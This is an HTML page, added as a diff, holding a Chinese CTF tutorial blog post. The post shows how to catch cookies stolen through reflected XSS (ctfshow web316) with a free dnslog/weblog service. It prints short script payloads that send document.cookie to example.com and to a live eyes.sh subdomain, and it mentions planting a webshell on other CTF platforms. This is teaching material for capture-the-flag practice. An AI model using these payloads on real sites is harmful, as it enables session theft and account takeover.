@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - 使用weblog平台接收xss窃取的cookie</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>使用weblog平台接收xss窃取的cookie</h1>
+    <p>
+        <span class="meta">发布于: 2025-06-16 01:51</span>
+    </p>
+    <div class="post-body">
+        <p>下面以反射型xss举例，使用免费无需登录的weblog平台记录http请求，拿到xss窃取的cookie，好用推荐！</p>
+<!-- more -->
+<p>什么是XSS？攻击者准备了一个payload，在用户点击后，在用户浏览器里执行了攻击者提供的javascript代码，js代码可以获取到用户的cookie等信息。xss题目一般后台会有一个机器人脚本/功能，定期执行用户提交的payload。</p>
+<p>例如，一个页面，会把url里的参数值显示在页面，例如<code>http://example.com/?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>，如果页面没有对参数值进行过滤，直接显示在页面上，那么就会执行<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>这段代码，弹出一个提示框。</p>
+<p>什么是叉自己？</p>
+<h2>叉自己举例/细节</h2>
+<p>下面以web316具体举例。</p>
+<p>打开靶机，看看自己的cookie，<code>flag=you are not admin no flag</code>，真实的flag是网站管理员的cookie，也就是后台的xss bot机器人的cookie</p>
+<p><img src="/images/xss-weblog/1.png" alt="1" /></p>
+<p>随便输入111，提交，提交的内容111直接显示在了页面上。重点提交的111是一个get参数出现在url里，可以在页面直接显示，有xss漏洞的可能。</p>
+<p><img src="/images/xss-weblog/2.png" alt="2" /></p>
+<p>提交一串js代码</p>
+<pre><code class="language-javascript">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<p>页面成功执行了js代码，弹出提示框1，说明有xss漏洞。</p>
+<p><img src="/images/xss-weblog/3.png" alt="3" /></p>
+<p>可以使用js代码，在用户打开恶意构造的url时，执行js，发起一个网络请求，把用户的cookie发送到攻击者的服务器上。</p>
+<p><strong>窃取用户cookie有什么用？</strong>，对于一些简单的站点，在访问站点时，带上该用户的cookie，有可能可以直接登录该用户的账号，获取用户的敏感信息。</p>
+<p>例如下面这段代码，获取当前页面网站的cookie，把网站重定向请求攻击者的服务器上，把这里的<code>http://example.com</code>换成自己服务器的ip就可以收到这个xss请求的cookie。</p>
+<pre><code class="language-javascript">&lt;script&gt;
+window.location.href = 'http://example.com/?cookie=' + document.cookie
+&lt;/script&gt;</code></pre>
+<p>新手师傅自然而然想到查看自己电脑的ip，把上面换成自己的ip，PHPstudy或者python开个web服务，发现flag是<code>you are not admin no flag</code>，没有拿到flag。</p>
+<p>例如我使用python开一个python http服务，我的ip是<code>192.168.6.116</code>，端口4444</p>
+<p><img src="/images/xss-weblog/4.png" alt="4" /></p>
+<p><strong>你拿到的这个cookie是谁的？你自己的。你写了一个恶意xss payload在攻击自己，叉自己。在你提交这个恶意payload时，靶机后台xss bot在执行这个js代码时，在他内网没有这个主机，找不到他内网的192.168.6.116这个ip，访问不到你的192，172，10段ip</strong></p>
+<p><img src="/images/xss-weblog/5.png" alt="5" /></p>
+<h2>解决方案</h2>
+<p>那就有好奇宝宝要问了，对啊对啊，我是内网ip，靶机访问不到我，我该怎么做这题？好问题，提供几个简单的方法</p>
+<ul>
+<li>使用网络上免费提供的<code>weblog</code>平台，把xss的请求url叉到这里。（简单推荐，0成本，即开即用）</li>
+<li>使用自己的公网服务器python开启一个http服务。注意不要直接在<code>~</code>目录开启，会泄露<code>~</code>目录的所有文件，网络上会有恶意攻击者专门扫描这个特征指纹。</li>
+<li>如果你在做ctfshow的xss，同时你还有攻防世界、buuctf、nssctf靶场的账号，在其他靶场找个简单的web题目，拿个webshell，写个php文件，把url请求的参数值写进文件。</li>
+<li>使用内网穿透攻击，把本地内网ip、端口映射到公网。</li>
+</ul>
+<p>这里只介绍第一种方法，其他方法自行探索。</p>
+<p><code>weblog</code>推荐平台 <a href="https://eyes.sh/dns/">eyes.sh</a></p>
+<p>打开，直接使用平台分配的账号进去，不需要自己注册。</p>
+<p>在<code>dnslog</code>页面，记录分配给你的子域名</p>
+<p><img src="/images/xss-weblog/6.png" alt="6" /></p>
+<p>修改xss payload，把受害者（xss bot）的cookie叉到这里，不出意外的话，会收到两个请求，一个是你提交payload时触发的请求，另一个是靶机后台xss bot执行payload时触发的请求。</p>
+<pre><code class="language-javascript">&lt;script&gt;
+window.location.href = 'http://enwvbm6o.eyes.sh/?cookie=' + document.cookie
+&lt;/script&gt;</code></pre>
+<p>验证成功</p>
+<p><img src="/images/xss-weblog/7.png" alt="7" /></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>XSS</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#weblog</span>
+                                    <span>#dnslog</span>
+                                    <span>#xss</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
